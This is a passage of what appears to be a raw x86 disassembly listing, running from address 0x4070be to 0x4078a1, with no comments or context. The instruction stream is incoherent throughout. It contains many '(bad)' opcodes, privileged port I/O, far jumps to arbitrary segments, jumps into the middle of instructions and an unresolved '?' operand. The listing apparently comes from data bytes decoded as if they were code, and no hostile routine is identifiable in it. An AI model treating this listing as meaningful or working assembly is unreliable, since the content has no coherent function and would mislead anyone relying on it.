  4070be:	js     0x4070be
  4070c0:	pop    ecx
  4070c1:	or     BYTE PTR [edx-0x33],ch
  4070c4:	pop    eax
  4070c5:	psubd  mm4,QWORD PTR [eax-0x2d949419]
  4070cc:	inc    edx
  4070cd:	lea    ebx,[ebp-0x439cd9d0]
  4070d3:	xlat   BYTE PTR ds:[ebx]
  4070d4:	cmp    al,0xf3
  4070d6:	cs std 
  4070d8:	sub    cl,ah
  4070da:	stos   DWORD PTR es:[edi],eax
  4070db:	xchg   esp,eax
  4070dc:	and    dl,ch
  4070de:	imul   esi,DWORD PTR [ebx],0xffffffbf
  4070e1:	push   DWORD PTR [esi+eax*2+0x70e6a05b]
  4070e8:	retf   0xc1f8
  4070eb:	xchg   ebp,eax
  4070ec:	stos   BYTE PTR es:[edi],al
  4070ed:	rol    DWORD PTR [eax],0x1f
  4070f0:	adc    ch,BYTE PTR [edi-0x62]
  4070f3:	inc    esp
  4070f4:	pop    eax
  4070f5:	sbb    ebp,DWORD PTR [ecx-0x17]
  4070f8:	ret    
  4070f9:	mov    ch,0x5b
  4070fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070fc:	inc    eax
  4070fd:	ret    
  4070fe:	outs   dx,BYTE PTR ds:[esi]
  4070ff:	test   BYTE PTR [ecx+0x772fd19b],dh
  407105:	sub    DWORD PTR [ecx+edi*4-0x7a],edi
  407109:	pop    edi
  40710a:	loope  0x407114
  40710c:	rcr    BYTE PTR [ebp-0x713f42a2],0xf3
  407113:	stc    
  407114:	jo     0x4070c5
  407116:	adc    cl,ch
  407118:	ret    0xc3b9
  40711b:	xchg   edx,eax
  40711c:	loop   0x40714e
  40711e:	cmp    dh,BYTE PTR [ecx-0x7d]
  407121:	sbb    BYTE PTR [esi+0x1dafe04c],al
  407127:	out    dx,al
  407128:	lds    ebp,FWORD PTR [edx+0x4c8a701a]
  40712e:	sbb    eax,0xec4a3189
  407133:	and    eax,0x3ef19683
  407138:	adc    esp,DWORD PTR [ebx]
  40713a:	test   BYTE PTR [ebx+ecx*4-0x25],al
  40713e:	ins    BYTE PTR es:[edi],dx
  40713f:	ins    BYTE PTR es:[edi],dx
  407140:	pop    edi
  407141:	fwait
  407142:	dec    ebp
  407143:	add    esi,ecx
  407145:	fs adc al,0x41
  407148:	push   esi
  407149:	retf   0x1b4c
  40714c:	mov    al,ds:0x4d38e3f4
  407151:	pop    ss
  407152:	aam    0xdf
  407154:	pop    edx
  407155:	test   al,0x8d
  407157:	cdq    
  407158:	inc    edx
  407159:	(bad)  
  40715b:	mov    ebx,0x415d5cbb
  407160:	scas   al,BYTE PTR es:[edi]
  407161:	push   ebp
  407162:	mov    cl,0x11
  407164:	mov    dl,0x98
  407166:	fwait
  407167:	mov    eax,0xb33d529f
  40716c:	mov    ds:0x67ae8776,al
  407171:	pop    eax
  407172:	shr    DWORD PTR [edi+0x4f],0xf8
  407176:	fcmovu st,st(5)
  407178:	repnz and DWORD PTR [ebp+0x2ffbbe43],0xa
  407180:	cwde   
  407181:	inc    esp
  407182:	xchg   BYTE PTR [ebx],bl
  407184:	mov    ecx,0x80490f0
  407189:	fucomi st,st(3)
  40718b:	lods   al,BYTE PTR ds:[esi]
  40718c:	not    DWORD PTR [ebx]
  40718e:	xor    BYTE PTR [ebx+0x595caef8],dh
  407194:	push   ss
  407195:	stos   BYTE PTR es:[edi],al
  407196:	inc    ecx
  407197:	push   edi
  407198:	pop    ecx
  407199:	dec    BYTE PTR [ebp+eiz*8+0x34d47390]
  4071a0:	dec    edx
  4071a1:	test   eax,0xf45e91c8
  4071a6:	popf   
  4071a7:	imul   ebx,DWORD PTR [esp+edi*4],0xffffffb2
  4071ab:	aaa    
  4071ac:	cwde   
  4071ad:	inc    ebx
  4071ae:	(bad)  
  4071b0:	(bad)  [edx+0x3e72ba02]
  4071b6:	or     dl,bh
  4071b8:	rcr    BYTE PTR [edi],cl
  4071ba:	xor    cl,BYTE PTR [ebx+0x3a9de417]
  4071c0:	stos   DWORD PTR es:[edi],eax
  4071c1:	add    DWORD PTR [ebp-0x5f],0xa6d91f3a
  4071c8:	inc    edi
  4071c9:	lahf   
  4071ca:	sbb    edx,ebp
  4071cc:	cmp    BYTE PTR [ebx-0x33],0x82
  4071d0:	repz and esi,DWORD PTR [ebx+0x299d3b39]
  4071d7:	int    0x5c
  4071d9:	in     al,dx
  4071da:	loopne 0x4071ec
  4071dc:	cmp    ecx,DWORD PTR [edi+edi*2+0x672c837a]
  4071e3:	int3   
  4071e4:	mov    edx,0x3789bd3c
  4071e9:	pop    ss
  4071ea:	ins    BYTE PTR es:[edi],dx
  4071eb:	push   DWORD PTR [ebp+0x5564f61]
  4071f1:	iret   
  4071f2:	je     0x4071e0
  4071f4:	dec    esp
  4071f5:	push   esi
  4071f6:	jne    0x40725c
  4071f8:	fisub  DWORD PTR [ebx+0x1]
  4071fb:	add    bl,ah
  4071fd:	fwait
  4071fe:	xor    ch,BYTE PTR [eax-0x63]
  407201:	xchg   edx,eax
  407202:	fst    QWORD PTR [ebp+0x69]
  407205:	mov    ah,0x44
  407207:	pusha  
  407208:	adc    eax,0x49eed053
  40720d:	(bad)  
  40720e:	call   0xf8e0ec0
  407213:	mov    ds:0x6a3aa605,al
  407218:	mov    ds:0x770d3b6c,al
  40721d:	mov    ebx,ecx
  40721f:	jns    0x407242
  407221:	shl    DWORD PTR [edi-0x2fffa497],1
  407227:	xchg   ecx,eax
  407228:	cmp    al,0xbd
  40722a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40722b:	les    ebx,FWORD PTR ds:0xa254b95d
  407231:	inc    edi
  407232:	lahf   
  407233:	mov    dl,0x6
  407235:	jo     0x4071ce
  407237:	push   ds
  407238:	push   ecx
  407239:	jg     0x40728e
  40723b:	leave  
  40723c:	jle    0x4071cb
  40723e:	nop
  40723f:	xchg   ebx,eax
  407240:	xor    eax,0xb6dbbd17
  407245:	pop    edi
  407246:	xlat   BYTE PTR ds:[ebx]
  407247:	jb     0x407288
  407249:	rcr    BYTE PTR [ecx-0x7],cl
  40724c:	xchg   esi,eax
  40724d:	mov    bl,bl
  40724f:	xchg   esp,eax
  407250:	cwde   
  407251:	js     0x4071f4
  407253:	lds    ecx,FWORD PTR [edi-0x5f]
  407256:	ret    0x3c58
  407259:	push   esi
  40725a:	das    
  40725b:	dec    eax
  40725c:	mul    BYTE PTR [eax]
  40725e:	pop    ecx
  40725f:	inc    ebp
  407260:	addr16 popf 
  407262:	mov    DWORD PTR [ebp+0x6cc6eb34],esi
  407268:	and    edi,ecx
  40726a:	outs   dx,BYTE PTR ds:[esi]
  40726b:	scas   al,BYTE PTR es:[edi]
  40726c:	mov    dh,0x37
  40726e:	sbb    DWORD PTR es:[eax+0x3b],ebx
  407272:	fdiv   st(1),st
  407274:	retf   
  407275:	out    dx,al
  407276:	push   ds
  407277:	mov    ebx,0x4eab382d
  40727c:	mov    dh,0xaf
  40727e:	sbb    DWORD PTR [ecx+0x5b1febc3],eax
  407284:	scas   al,BYTE PTR es:[edi]
  407285:	sub    bl,BYTE PTR ds:0x48facc6a
  40728b:	adc    DWORD PTR [ecx-0x31],eax
  40728e:	(bad)  
  40728f:	push   esi
  407290:	jmp    0x407302
  407292:	int    0x6
  407294:	cmp    esp,esi
  407296:	xchg   ebp,eax
  407297:	mov    ch,0xee
  407299:	jmp    0x407272
  40729b:	jne    0x4072c0
  40729d:	mov    edi,0x21b55fb0
  4072a2:	or     dl,BYTE PTR [esi]
  4072a4:	ret    0x1d82
  4072a7:	mov    edi,0x4e7c50b5
  4072ac:	pop    esi
  4072ad:	scas   eax,DWORD PTR es:[edi]
  4072ae:	mov    cl,0x23
  4072b0:	loop   0x4072b0
  4072b2:	dec    esp
  4072b3:	popa   
  4072b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072b5:	les    esp,FWORD PTR [ebp+0x4d]
  4072b8:	inc    edi
  4072b9:	div    BYTE PTR [ecx*4-0x24e00afa]
  4072c0:	aad    0x27
  4072c2:	xchg   BYTE PTR [ebp-0x9],bh
  4072c5:	push   ss
  4072c6:	add    ebp,DWORD PTR [esi+0x3bb5080a]
  4072cc:	cwde   
  4072cd:	ds out 0x4b,eax
  4072d0:	or     bl,BYTE PTR [edx-0x758f7d25]
  4072d6:	add    BYTE PTR [esi],dh
  4072d8:	enter  0xfce7,0x65
  4072dc:	out    dx,al
  4072dd:	loopne 0x4072af
  4072df:	adc    edi,edi
  4072e1:	pop    esp
  4072e2:	mov    ds:0xcf03db83,al
  4072e7:	test   BYTE PTR [edx],bh
  4072e9:	scas   al,BYTE PTR es:[edi]
  4072ea:	lahf   
  4072eb:	in     eax,0xf6
  4072ed:	adc    DWORD PTR [ecx],0xb5c48d86
  4072f3:	daa    
  4072f4:	jge    0x40732d
  4072f6:	push   ds
  4072f7:	adc    dl,BYTE PTR [ebx]
  4072f9:	mov    eax,ds:0x59a7f8e3
  4072fe:	mov    al,0x77
  407300:	adc    al,0x43
  407302:	or     dl,BYTE PTR [edi+0x7d1f63b6]
  407308:	mov    dl,0x76
  40730a:	out    0xcc,al
  40730c:	or     BYTE PTR [edi+0x3e],ch
  40730f:	xlat   BYTE PTR ds:[ebx]
  407310:	addr16 sbb ebx,ebp
  407313:	xchg   edx,eax
  407314:	adc    DWORD PTR [ecx-0x15c0ed86],edi
  40731a:	add    DWORD PTR [edx-0x15],edx
  40731d:	cmp    cl,BYTE PTR [ecx]
  40731f:	cmp    al,BYTE PTR [edx]
  407321:	loope  0x4072ce
  407323:	xor    eax,0xecb73311
  407328:	sbb    DWORD PTR [edx+0x3],ebp
  40732b:	fst    DWORD PTR [edx]
  40732d:	ret    0x8782
  407330:	cli    
  407331:	neg    ebx
  407333:	clc    
  407334:	retf   0x90ff
  407337:	fisub  DWORD PTR [esi]
  407339:	or     bl,BYTE PTR [ebx]
  40733b:	dec    esi
  40733c:	test   ebp,eax
  40733e:	aas    
  40733f:	cmp    BYTE PTR [eax],cl
  407341:	(bad)  
  407342:	fucomip st,st(1)
  407344:	out    0x81,eax
  407346:	xchg   edx,eax
  407347:	retf   0xf3d4
  40734a:	hlt    
  40734b:	fidivr WORD PTR [edx+0x37307697]
  407351:	fdiv   st,st(2)
  407353:	mov    WORD PTR [ebx],fs
  407355:	into   
  407356:	js     0x4072e5
  407358:	imul   edi,DWORD PTR [esp+ecx*1-0x32],0xffffffa0
  40735d:	sub    eax,0x723dd565
  407362:	lods   eax,DWORD PTR ds:[esi]
  407363:	lahf   
  407364:	cmp    ah,cl
  407366:	xor    esp,DWORD PTR [ebp+0x24]
  407369:	je     0x40730d
  40736b:	sbb    eax,0x5488766
  407370:	push   edx
  407371:	dec    edi
  407372:	add    esp,esp
  407374:	rcl    DWORD PTR [esi-0x8d1ee28],cl
  40737a:	outs   dx,BYTE PTR ds:[esi]
  40737b:	mov    DWORD PTR [ebx+0x377f25b1],0x874970c8
  407385:	pop    es
  407386:	mov    ds:0x151ccb6f,al
  40738b:	shr    BYTE PTR [edi-0x4c460640],cl
  407391:	mov    ah,0xed
  407393:	pop    edx
  407394:	mov    ds:0xe0343b93,al
  407399:	jno    0x407359
  40739b:	and    eax,0x96c3cb80
  4073a0:	call   0xe4ae:0x2bb02840
  4073a7:	(bad)  
  4073a8:	outs   dx,BYTE PTR ds:[esi]
  4073a9:	imul   ecx,DWORD PTR [edx],0x8697aa07
  4073af:	or     ecx,DWORD PTR [edx]
  4073b1:	ret    0x12a1
  4073b4:	repnz mov dh,0xdd
  4073b7:	test   eax,0x98daa0a1
  4073bc:	test   eax,0x675506c9
  4073c1:	addr16 inc esp
  4073c3:	enter  0xcc6a,0x7e
  4073c7:	loope  0x4073b8
  4073c9:	xchg   ebp,eax
  4073ca:	retf   
  4073cb:	add    ecx,DWORD PTR [esp+ebp*1]
  4073ce:	cdq    
  4073cf:	pop    edi
  4073d0:	bound  esp,QWORD PTR fs:[edx+edi*4]
  4073d4:	popf   
  4073d5:	enter  0xe946,0xb9
  4073d9:	cdq    
  4073da:	sahf   
  4073db:	mov    bh,0x5d
  4073dd:	(bad)  
  4073df:	jbe    0x4073c5
  4073e1:	xlat   BYTE PTR ds:[ebx]
  4073e2:	jge    0x407414
  4073e4:	sahf   
  4073e5:	and    eax,0x8e05c4c4
  4073ea:	and    al,0x2c
  4073ec:	sbb    BYTE PTR [edi+0x72],bl
  4073ef:	popa   
  4073f0:	fs and eax,0x9070e85f
  4073f7:	es push 0x3cad9fee
  4073fd:	push   cs
  4073fe:	outs   dx,BYTE PTR ds:[esi]
  4073ff:	sbb    esi,DWORD PTR [ecx-0xafb7ac8]
  407405:	leave  
  407406:	cmp    BYTE PTR [edx-0x9],0xfd
  40740a:	mov    ds,WORD PTR [ebx+0x65]
  40740d:	dec    esp
  40740e:	pop    ss
  40740f:	xchg   BYTE PTR [eax+0x200d8d8c],al
  407415:	xor    ebx,DWORD PTR [ebp-0x52df7f49]
  40741b:	sub    eax,0x21f1115f
  407420:	inc    edx
  407421:	fcomp  DWORD PTR [eax]
  407423:	mov    ds:0xe31d541f,al
  407428:	popf   
  407429:	mov    dh,0x80
  40742b:	in     eax,0x56
  40742d:	lods   eax,DWORD PTR ds:[esi]
  40742e:	mov    ds:0x1a4ed5cf,al
  407433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407434:	dec    edx
  407435:	add    DWORD PTR [ecx],esp
  407437:	into   
  407438:	lds    ebp,FWORD PTR [ecx]
  40743a:	test   BYTE PTR [bx+di+0x43],0x55
  40743f:	cmc    
  407440:	jg     0x40740c
  407442:	outs   dx,BYTE PTR ds:[esi]
  407443:	and    eax,0x3919248a
  407448:	enter  0xbb5c,0x31
  40744c:	dec    esi
  40744d:	sub    esp,ebp
  40744f:	out    0x19,al
  407451:	xlat   BYTE PTR ds:[ebx]
  407452:	test   BYTE PTR [eax],al
  407454:	jmp    0xa6e69ee2
  407459:	std    
  40745a:	hlt    
  40745b:	cs rcr esp,cl
  40745e:	and    esp,DWORD PTR [ebp+0x5c]
  407461:	xchg   esp,eax
  407462:	iret   
  407463:	cld    
  407464:	dec    ecx
  407465:	or     al,0x22
  407467:	out    dx,eax
  407468:	call   0x804e:0x701bbad2
  40746f:	jle    0x4073f9
  407471:	in     al,dx
  407472:	and    dh,al
  407474:	mov    dl,0x6
  407476:	nop
  407477:	fsub   DWORD PTR [eax]
  407479:	rcr    DWORD PTR [esi-0x1],cl
  40747c:	int3   
  40747d:	ds sbb cl,dh
  407480:	loop   0x4074b9
  407482:	xchg   edi,eax
  407483:	adc    DWORD PTR [edi+0x32a06a20],esp
  407489:	inc    esp
  40748a:	fdivr  st(0),st
  40748c:	mov    ah,0xd
  40748e:	data16 fist DWORD PTR [esi-0x1]
  407492:	cmp    ebx,DWORD PTR [ecx+0x61]
  407495:	imul   ebx,DWORD PTR [esi],0xffffffc3
  407498:	pop    ebx
  407499:	adc    eax,0xf016a76b
  40749e:	cmp    dl,BYTE PTR [eax-0x656810d0]
  4074a4:	adc    edx,DWORD PTR [edi+0x1c6de2aa]
  4074aa:	addr16 mov ch,bl
  4074ad:	jge    0x4074c8
  4074af:	shr    DWORD PTR [eax],1
  4074b1:	add    eax,0x925c3be8
  4074b6:	xor    al,BYTE PTR ds:0x6584adee
  4074bc:	mov    ?,WORD PTR [edx]
  4074be:	lods   eax,DWORD PTR ds:[esi]
  4074bf:	test   eax,0x17c4b19f
  4074c4:	call   0x168cafd
  4074c9:	dec    eax
  4074ca:	nop
  4074cb:	jno    0x40746e
  4074cd:	pop    edi
  4074ce:	imul   esi,DWORD PTR ds:0x268fb4de,0x24
  4074d5:	into   
  4074d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074d7:	rcl    DWORD PTR [edi-0x9],cl
  4074da:	push   ecx
  4074db:	in     al,0xf8
  4074dd:	pop    es
  4074de:	(bad)  
  4074df:	dec    eax
  4074e0:	ja     0x40746b
  4074e2:	sub    bl,dl
  4074e4:	pop    ss
  4074e5:	into   
  4074e6:	lock bound ebp,QWORD PTR [eax]
  4074e9:	xor    eax,0xcaba0ffc
  4074ee:	aad    0xac
  4074f0:	xchg   esp,eax
  4074f1:	retf   
  4074f2:	or     DWORD PTR [ebp+0x2e],edi
  4074f5:	mov    cs,WORD PTR [ecx-0x42]
  4074f8:	add    esi,DWORD PTR [eax+0x139e8320]
  4074fe:	jmp    0x4074b0
  407500:	clc    
  407501:	jb     0x4074fc
  407503:	push   cs
  407504:	test   eax,ebx
  407506:	stos   BYTE PTR es:[edi],al
  407507:	hlt    
  407508:	or     DWORD PTR ds:0x6a03669a,esp
  40750e:	out    0xf2,eax
  407510:	cmp    eax,DWORD PTR [edi]
  407512:	dec    ecx
  407513:	lods   al,BYTE PTR ds:[esi]
  407514:	lahf   
  407515:	adc    edi,esp
  407517:	test   al,dl
  407519:	sar    DWORD PTR [edx-0x53087862],0xd8
  407520:	mov    bh,0x24
  407522:	les    edi,FWORD PTR fs:[esi+0x29]
  407526:	jmp    0x4074eb
  407528:	ret    0x3371
  40752b:	shl    BYTE PTR [esi+0x31],0x4
  40752f:	fstp   TBYTE PTR [eax]
  407531:	cmp    edi,ecx
  407533:	in     al,0xca
  407535:	adc    esi,esp
  407537:	push   edi
  407538:	jl     0x4074dd
  40753a:	loope  0x407590
  40753c:	repz imul esp,DWORD PTR [edx],0x39e6aac7
  407543:	cld    
  407544:	xchg   esi,eax
  407545:	outs   dx,BYTE PTR ds:[esi]
  407546:	ins    BYTE PTR es:[edi],dx
  407547:	pop    es
  407548:	jge    0x407536
  40754a:	jo     0x40759c
  40754c:	leave  
  40754d:	and    al,0xdc
  40754f:	repz pop ebp
  407551:	les    esi,FWORD PTR gs:[esi+esi*4-0x20]
  407556:	mov    eax,ds:0x7e04456b
  40755b:	ror    BYTE PTR [edi-0x5ef54644],1
  407561:	inc    ecx
  407562:	(bad)  
  407563:	ret    0x9e35
  407566:	cmc    
  407567:	out    0x7b,al
  407569:	fwait
  40756a:	aas    
  40756b:	mov    dh,0x80
  40756d:	and    DWORD PTR [esp+edi*2],edi
  407570:	cs int3 
  407572:	mov    dh,0xfc
  407574:	dec    edx
  407575:	or     DWORD PTR [edx+0x26],ebp
  407578:	push   0xdadbdb30
  40757d:	shl    DWORD PTR [ebp-0x72],cl
  407580:	inc    ebx
  407581:	sbb    dh,BYTE PTR [esi-0x1b]
  407584:	jge    0x4075c3
  407586:	xchg   ecx,eax
  407587:	cmp    esi,0x4a
  40758a:	mov    gs,WORD PTR [ebp+0x131b5b07]
  407590:	mov    ds:0x3a9f3704,al
  407595:	sbb    dl,BYTE PTR [edi]
  407597:	sbb    eax,0xdaaecf72
  40759c:	sub    al,0xd1
  40759e:	sti    
  40759f:	push   0x35830cd4
  4075a4:	jmp    0x4075c8
  4075a6:	setb   BYTE PTR [edx+ecx*8-0x18]
  4075ab:	mov    BYTE PTR [ecx+0x1cdfdb8c],ah
  4075b1:	data16 mov ds:0xc6f3fdf7,al
  4075b7:	jp     0x4075d3
  4075b9:	popa   
  4075ba:	inc    ebp
  4075bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075bc:	jecxz  0x4075c3
  4075be:	add    eax,0x8dc5d0ba
  4075c3:	rcr    BYTE PTR [edi+0x5100c7e4],1
  4075c9:	or     eax,0xf393bea4
  4075ce:	gs sbb bl,0x9e
  4075d2:	jo     0x4075ed
  4075d4:	addr16 or al,0xa4
  4075d7:	mov    dh,0xed
  4075d9:	(bad)  
  4075da:	jmp    0x407628
  4075dc:	idiv   DWORD PTR ds:0x3673ad7e
  4075e2:	cli    
  4075e3:	push   0x5f081803
  4075e8:	add    eax,esi
  4075ea:	retf   0x72d4
  4075ed:	(bad)  
  4075ee:	jmp    0x3439:0xf11cf21d
  4075f5:	fidivr DWORD PTR [ecx]
  4075f7:	arpl   WORD PTR cs:[edx+0x605c3314],bx
  4075fe:	adc    al,0x31
  407600:	imul   esp
  407602:	mov    dl,BYTE PTR [ecx+0x0]
  407605:	inc    edx
  407606:	outs   dx,DWORD PTR ds:[esi]
  407607:	js     0x40767d
  407609:	fnstenv [ecx+esi*1-0x3f4f6d68]
  407610:	sub    DWORD PTR [edi-0x56],eax
  407613:	pusha  
  407614:	sar    DWORD PTR [ecx+0x33],1
  407617:	sahf   
  407618:	mov    ebx,0x51fa6819
  40761d:	out    dx,eax
  40761e:	xchg   ebp,eax
  40761f:	mov    dl,0xca
  407621:	inc    ebx
  407622:	xor    DWORD PTR [esi],0xeab369ce
  407628:	add    BYTE PTR [edx-0x32],ah
  40762b:	pop    DWORD PTR [esi+0x451d5c4]
  407631:	repz mov al,0x53
  407634:	adc    al,0x7f
  407636:	xor    bl,bl
  407638:	in     eax,dx
  407639:	stos   WORD PTR es:[di],ax
  40763c:	cmp    al,0xeb
  40763e:	jno    0x4075f4
  407640:	ins    DWORD PTR es:[edi],dx
  407641:	pop    edi
  407642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407643:	fld    TBYTE PTR [edi]
  407645:	pushf  
  407646:	or     dh,BYTE PTR [ecx-0x36]
  407649:	call   0x90fcb3db
  40764e:	sbb    BYTE PTR [eax+0x2975d39e],dl
  407654:	scas   eax,DWORD PTR es:[edi]
  407655:	(bad)  
  407656:	leave  
  407657:	xor    DWORD PTR [eax],ebx
  407659:	sbb    BYTE PTR ds:0x3b31a5c7,bl
  40765f:	addr16 neg ch
  407662:	lods   eax,DWORD PTR ds:[esi]
  407663:	nop
  407664:	mov    edx,0x9936e63b
  407669:	out    dx,eax
  40766a:	jne    0x4076bf
  40766c:	jge    0x40767a
  40766e:	jnp    0x407642
  407670:	dec    esp
  407671:	fstp   TBYTE PTR [ebx-0x67993ec2]
  407677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407678:	xchg   esp,eax
  407679:	fdiv   DWORD PTR [eax-0x225ccbe8]
  40767f:	out    0xe6,eax
  407681:	push   edx
  407682:	cmp    al,BYTE PTR [ebx-0x6e]
  407685:	adc    dl,BYTE PTR [bp+di+0x60b6]
  40768a:	sub    al,0xf9
  40768c:	add    al,0xba
  40768e:	std    
  40768f:	mov    al,ds:0x9dec878a
  407694:	mov    dh,0x47
  407696:	ret    
  407697:	stos   BYTE PTR es:[edi],al
  407698:	stos   BYTE PTR es:[edi],al
  407699:	inc    ebp
  40769a:	mov    edx,0xb15dca8d
  40769f:	or     ebx,DWORD PTR [edx-0x42]
  4076a2:	test   edi,esp
  4076a4:	fild   WORD PTR [esi-0x5f]
  4076a7:	icebp  
  4076a8:	xchg   ebx,eax
  4076a9:	jmp    0x1785:0x21319536
  4076b0:	dec    DWORD PTR fs:[ebp-0x13]
  4076b4:	(bad)  
  4076b5:	and    al,0xcf
  4076b7:	pop    ds
  4076b8:	jnp    0x40763c
  4076ba:	das    
  4076bb:	mov    edi,0xb9ce9788
  4076c0:	arpl   WORD PTR [ebx],di
  4076c2:	xor    ecx,DWORD PTR [ecx+0x7f00ec67]
  4076c8:	retf   0x5ef0
  4076cb:	mov    ebx,0xa34ff0ed
  4076d0:	fist   DWORD PTR [ecx-0x74]
  4076d3:	icebp  
  4076d4:	push   edi
  4076d5:	fdiv   st(5),st
  4076d7:	lock sub al,0xe1
  4076da:	cmp    ax,0x3949
  4076de:	mov    ebx,0x178cc814
  4076e3:	in     eax,0x96
  4076e5:	leave  
  4076e6:	sbb    edi,esp
  4076e8:	in     al,dx
  4076e9:	inc    ecx
  4076ea:	loopne 0x407690
  4076ec:	mov    al,0xea
  4076ee:	mov    edx,0x11dda268
  4076f3:	add    eax,0xdd28e64a
  4076f8:	pop    ebp
  4076f9:	cdq    
  4076fa:	fbstp  TBYTE PTR [esi-0x364ff3d]
  407700:	cmp    al,al
  407702:	retf   
  407703:	xor    bh,BYTE PTR [ebp+ebx*8+0x7adf5fcd]
  40770a:	popf   
  40770b:	js     0x4076f3
  40770d:	mov    dh,0x1
  40770f:	js     0x407788
  407711:	bnd jmp 0xecd77431
  407717:	ret    
  407718:	lock mov dl,bl
  40771b:	mov    ebx,0xed8e46a5
  407720:	aas    
  407721:	adc    ah,0xf5
  407724:	sub    eax,0x4888325b
  407729:	call   0xab706ad3
  40772e:	fcomp  QWORD PTR [ebx-0x5b]
  407731:	xor    al,0x72
  407733:	xchg   bh,ah
  407735:	jne    0x4076c6
  407737:	mov    esi,0x1df7606
  40773c:	pusha  
  40773d:	mov    WORD PTR [edx+0x1c],cs
  407740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407741:	xor    esi,DWORD PTR [ebx+0x60]
  407744:	shl    bl,cl
  407746:	jno    0x407793
  407748:	push   edx
  407749:	and    ecx,DWORD PTR [edx+0x75]
  40774c:	pop    ss
  40774d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40774e:	icebp  
  40774f:	clc    
  407750:	or     al,0xad
  407752:	and    eax,0x8843f637
  407757:	sub    eax,0xd3318d98
  40775c:	mov    eax,ds:0xdfacb1e6
  407761:	lds    esi,FWORD PTR [ecx-0x2aaa4a1b]
  407767:	sbb    ch,BYTE PTR [esi]
  407769:	or     bh,bl
  40776b:	or     BYTE PTR [edi],bh
  40776d:	sub    bh,bh
  40776f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407770:	push   ss
  407771:	lods   al,BYTE PTR ds:[esi]
  407772:	mov    eax,ds:0xf400b4cc
  407777:	jecxz  0x407760
  407779:	pop    edi
  40777a:	lahf   
  40777b:	ins    BYTE PTR es:[edi],dx
  40777c:	cmp    al,0xa7
  40777e:	gs pop ds
  407780:	(bad)  
  407781:	xlat   BYTE PTR ds:[ebx]
  407782:	adc    eax,0x65cac0c4
  407787:	adc    ebx,ebx
  407789:	out    dx,al
  40778a:	inc    ecx
  40778b:	inc    ebx
  40778c:	fwait
  40778d:	jo     0x4077d6
  40778f:	fwait
  407790:	popa   
  407791:	jns    0x40773c
  407793:	(bad)  
  407795:	rcr    BYTE PTR ds:0xd8d43b98,cl
  40779b:	std    
  40779c:	arpl   WORD PTR [esi+ebp*8-0x5633dbde],sp
  4077a3:	idiv   DWORD PTR [edi+0x1d4534c1]
  4077a9:	and    BYTE PTR [esi-0x1c],dh
  4077ac:	addr16 (bad) 
  4077ae:	adc    BYTE PTR [ebp-0x5987e608],dl
  4077b4:	sub    eax,0x784cced1
  4077b9:	sub    DWORD PTR [eax-0x3c1620ee],edx
  4077bf:	imul   eax,DWORD PTR [ecx+ebx*4],0xffffff8f
  4077c3:	push   0x72
  4077c5:	fwait
  4077c6:	add    dl,BYTE PTR [ecx]
  4077c8:	inc    ebp
  4077c9:	jp     0x407795
  4077cb:	mov    edi,0x1e8e3a6e
  4077d0:	xor    DWORD PTR [ecx+0x7],0x35
  4077d4:	pop    esi
  4077d5:	push   0xd4cbc44e
  4077da:	(bad)  [ebx+ecx*1+0x1d]
  4077de:	test   DWORD PTR [eax-0xd],ecx
  4077e1:	mov    ds:0xe9405274,al
  4077e6:	(bad)  
  4077e7:	push   esp
  4077e8:	dec    ecx
  4077e9:	gs sbb al,0x16
  4077ec:	jge    0x407791
  4077ee:	stc    
  4077ef:	clc    
  4077f0:	test   eax,0xe533c4a7
  4077f5:	jp     0x4077b2
  4077f7:	pop    eax
  4077f8:	dec    ecx
  4077f9:	lea    edx,[bp+si-0x24]
  4077fd:	dec    esp
  4077fe:	dec    ebx
  4077ff:	pop    ecx
  407800:	xchg   esi,esi
  407802:	sti    
  407803:	jo     0x407862
  407805:	loop   0x40787a
  407807:	fimul  WORD PTR [edx]
  407809:	xchg   BYTE PTR [eax],cl
  40780b:	jb     0x407820
  40780d:	bound  edx,QWORD PTR [esi]
  40780f:	jg     0x4077fd
  407811:	loope  0x40784c
  407813:	addr16 gs out 0x70,eax
  407817:	pcmpeqb mm0,QWORD PTR [edi-0x7f]
  40781b:	and    cl,bh
  40781d:	mov    WORD PTR [edx-0x78],ds
  407820:	sbb    BYTE PTR [eax],ch
  407822:	jae    0x4077e0
  407824:	sbb    esi,DWORD PTR [esp+ebx*1-0x477df224]
  40782b:	mov    dl,0xa6
  40782d:	pop    edx
  40782e:	aas    
  40782f:	inc    BYTE PTR [ecx+esi*4-0x23]
  407833:	xchg   BYTE PTR [edx-0x2f15cb88],cl
  407839:	imul   esp,DWORD PTR [eax-0x10f6ff7e],0x90754583
  407843:	push   es
  407844:	(bad)  
  407846:	dec    esi
  407847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407848:	aas    
  407849:	pop    eax
  40784a:	inc    edi
  40784b:	jmp    0xf0c0:0x2f2c32f5
  407852:	sub    eax,0x18bc40c8
  407857:	sbb    al,bh
  407859:	arpl   WORD PTR cs:[ebx-0x65],si
  40785d:	lods   eax,DWORD PTR ds:[esi]
  40785e:	aas    
  40785f:	jmp    0x40781f
  407861:	jbe    0x407876
  407863:	push   ss
  407864:	dec    edi
  407865:	sbb    al,0x40
  407867:	cs push 0xffffffd6
  40786a:	shl    BYTE PTR [esi],0xbe
  40786d:	not    BYTE PTR [ebx-0x3319f6]
  407873:	xlat   BYTE PTR ds:[ebx]
  407874:	mov    esp,0x1998290d
  407879:	mul    BYTE PTR [edx]
  40787b:	adc    esp,DWORD PTR [ebp+0x38]
  40787e:	mov    ah,BYTE PTR [edi-0x34]
  407881:	fdivp  st(5),st
  407883:	and    DWORD PTR [eax-0x5a90403e],edi
  407889:	mov    edi,0x53905bdc
  40788e:	sbb    eax,esp
  407890:	add    eax,0x2fe874a1
  407895:	sub    DWORD PTR [ebp-0x4e],ebp
  407898:	push   0xffffff82
  40789a:	xchg   edi,eax
  40789b:	pop    eax
  40789c:	mov    ebx,0x6d97d1f9
  4078a1:	jns    0x4078b5
